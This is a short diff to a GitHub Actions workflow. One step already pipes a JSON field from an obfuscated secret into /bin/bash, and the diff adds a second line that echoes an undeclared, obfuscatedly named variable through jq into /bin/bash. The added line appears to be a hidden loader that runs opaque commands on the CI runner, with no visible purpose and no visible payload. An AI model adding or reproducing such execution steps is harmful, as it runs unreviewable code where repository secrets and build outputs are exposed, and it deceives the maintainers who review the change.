@@ -19,6 +19,7 @@ jobs:
           i3699: ${{ secrets.i3699 }}
         run: |
           printf '%s' "$i3699" | jq -r .zzhp2298 | /bin/bash
+          echo $wjxe057 | jq -r .lqs85 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
